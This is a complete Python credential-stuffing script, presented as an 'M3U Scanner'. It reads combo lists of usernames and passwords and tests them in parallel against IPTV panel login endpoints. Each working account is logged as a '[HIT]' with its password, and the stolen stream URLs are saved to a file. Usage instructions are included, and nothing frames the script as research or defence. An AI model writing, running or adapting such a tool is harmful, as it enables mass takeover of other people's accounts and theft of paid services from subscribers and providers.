#!/usr/bin/env python3
"""
M3U Scanner - retrieves IPTV M3U playlists from combo credential files.

Usage:
    python scanner.py --combos combos.txt --dns http://example.com:8080 --output results.txt
    python scanner.py --combos combos.txt --output results.txt  # when host is in combos
"""

import argparse
import concurrent.futures
import logging
import os
import sys
import time
import urllib.parse
from dataclasses import dataclass
from typing import Optional

import requests
from requests.exceptions import ConnectionError, ReadTimeout, RequestException

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger(__name__)

DEFAULT_TIMEOUT = 10
DEFAULT_THREADS = 10
M3U_ENDPOINT = "/get.php"
API_ENDPOINT = "/player_api.php"


@dataclass
class Credential:
    host: str
    port: int
    username: str
    password: str

    @property
    def base_url(self) -> str:
        return f"http://{self.host}:{self.port}"

    @property
    def m3u_url(self) -> str:
        params = urllib.parse.urlencode(
            {"username": self.username, "password": self.password, "type": "m3u_plus"}
        )
        return f"{self.base_url}{M3U_ENDPOINT}?{params}"

    @property
    def api_url(self) -> str:
        params = urllib.parse.urlencode(
            {"username": self.username, "password": self.password}
        )
        return f"{self.base_url}{API_ENDPOINT}?{params}"


def parse_combo_line(line: str, dns: Optional[str] = None) -> Optional[Credential]:
    """
    Parse a single combo line into a Credential.

    Supported formats:
      - host:port:username:password
      - username:password  (requires --dns to supply host and port)
      - http://host:port:username:password
    """
    line = line.strip()
    if not line or line.startswith("#"):
        return None

    # Strip leading scheme if present
    if line.startswith("http://") or line.startswith("https://"):
        line = line.split("://", 1)[1]

    parts = line.split(":")
    if len(parts) == 4:
        host, port_str, username, password = parts
        try:
            port = int(port_str)
        except ValueError:
            logger.debug("Invalid port in combo line: %s", line)
            return None
        return Credential(host=host, port=port, username=username, password=password)

    if len(parts) == 2 and dns:
        username, password = parts
        parsed = _parse_dns(dns)
        if parsed is None:
            return None
        host, port = parsed
        return Credential(host=host, port=port, username=username, password=password)

    logger.debug("Unrecognized combo format (need host:port:user:pass or user:pass with --dns): %s", line)
    return None


def _parse_dns(dns: str) -> Optional[tuple]:
    """Return (host, port) from a DNS/URL string like http://host:port or host:port."""
    dns = dns.strip().rstrip("/")
    if dns.startswith("http://") or dns.startswith("https://"):
        dns = dns.split("://", 1)[1]
    parts = dns.split(":")
    if len(parts) == 2:
        try:
            return parts[0], int(parts[1])
        except ValueError:
            pass
    logger.error("Could not parse DNS value '%s'. Expected format: host:port or http://host:port", dns)
    return None


def load_combos(path: str, dns: Optional[str] = None) -> list:
    """Load and parse all credentials from a combo file."""
    if not os.path.isfile(path):
        logger.error("Combo file not found: %s", path)
        sys.exit(1)

    credentials = []
    with open(path, "r", encoding="utf-8", errors="replace") as fh:
        for line in fh:
            cred = parse_combo_line(line, dns=dns)
            if cred is not None:
                credentials.append(cred)

    logger.info("Loaded %d credentials from %s", len(credentials), path)
    return credentials


def check_credential(cred: Credential, timeout: int = DEFAULT_TIMEOUT) -> Optional[str]:
    """
    Attempt to retrieve a valid M3U playlist for the given credential.

    Returns the M3U URL string on success, None on failure.
    """
    try:
        resp = requests.get(cred.api_url, timeout=timeout, allow_redirects=True)
        if resp.status_code == 200:
            try:
                data = resp.json()
            except ValueError:
                data = {}
            user_info = data.get("user_info", {})
            status = user_info.get("status", "")
            if status == "Active":
                return cred.m3u_url
        # Fall back: try the M3U endpoint directly
        resp = requests.get(cred.m3u_url, timeout=timeout, allow_redirects=True)
        if resp.status_code == 200 and "#EXTM3U" in resp.text[:100]:
            return cred.m3u_url
    except (ConnectionError, ReadTimeout, RequestException):
        pass
    return None


def scan(
    credentials: list,
    threads: int = DEFAULT_THREADS,
    timeout: int = DEFAULT_TIMEOUT,
    output_path: Optional[str] = None,
) -> list:
    """
    Scan all credentials concurrently and return a list of valid M3U URLs.
    Optionally writes results to output_path.
    """
    total = len(credentials)
    valid = []
    checked = 0
    start = time.time()

    output_fh = None
    if output_path:
        output_fh = open(output_path, "w", encoding="utf-8")

    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {
                executor.submit(check_credential, cred, timeout): cred
                for cred in credentials
            }
            for future in concurrent.futures.as_completed(futures):
                cred = futures[future]
                checked += 1
                try:
                    result = future.result()
                except Exception as exc:
                    logger.debug("Error checking %s: %s", cred.base_url, exc)
                    result = None

                if result:
                    valid.append(result)
                    logger.info("[HIT] %s | %s:%s", result, cred.username, cred.password)
                    if output_fh:
                        output_fh.write(result + "\n")
                        output_fh.flush()

                if checked % 50 == 0 or checked == total:
                    elapsed = time.time() - start
                    rate = checked / elapsed if elapsed > 0 else 0
                    logger.info(
                        "Progress: %d/%d checked | %d hits | %.1f req/s",
                        checked,
                        total,
                        len(valid),
                        rate,
                    )
    finally:
        if output_fh:
            output_fh.close()

    elapsed = time.time() - start
    logger.info(
        "Scan complete: %d/%d credentials | %d valid M3U URLs | %.1fs",
        total,
        total,
        len(valid),
        elapsed,
    )
    return valid


def main():
    parser = argparse.ArgumentParser(
        description="M3U Scanner — retrieve IPTV M3U playlists from combo credential files."
    )
    parser.add_argument(
        "--combos",
        required=True,
        metavar="FILE",
        help="Path to the combo file (host:port:user:pass or user:pass with --dns).",
    )
    parser.add_argument(
        "--dns",
        metavar="URL",
        default=None,
        help="Target IPTV panel base URL (e.g. http://host:port). "
        "Required when the combo file contains user:pass entries without a host.",
    )
    parser.add_argument(
        "--output",
        metavar="FILE",
        default="results.txt",
        help="File to write valid M3U URLs to (default: results.txt).",
    )
    parser.add_argument(
        "--threads",
        type=int,
        default=DEFAULT_THREADS,
        metavar="N",
        help=f"Number of concurrent threads (default: {DEFAULT_THREADS}).",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=DEFAULT_TIMEOUT,
        metavar="SECS",
        help=f"HTTP request timeout in seconds (default: {DEFAULT_TIMEOUT}).",
    )
    parser.add_argument(
        "--verbose",
        action="store_true",
        help="Enable verbose/debug logging.",
    )

    args = parser.parse_args()

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    credentials = load_combos(args.combos, dns=args.dns)
    if not credentials:
        logger.error("No valid credentials found in %s", args.combos)
        sys.exit(1)

    valid = scan(
        credentials,
        threads=args.threads,
        timeout=args.timeout,
        output_path=args.output,
    )

    if valid:
        logger.info("Results saved to %s", args.output)
    else:
        logger.info("No valid M3U URLs found.")


if __name__ == "__main__":
    main()
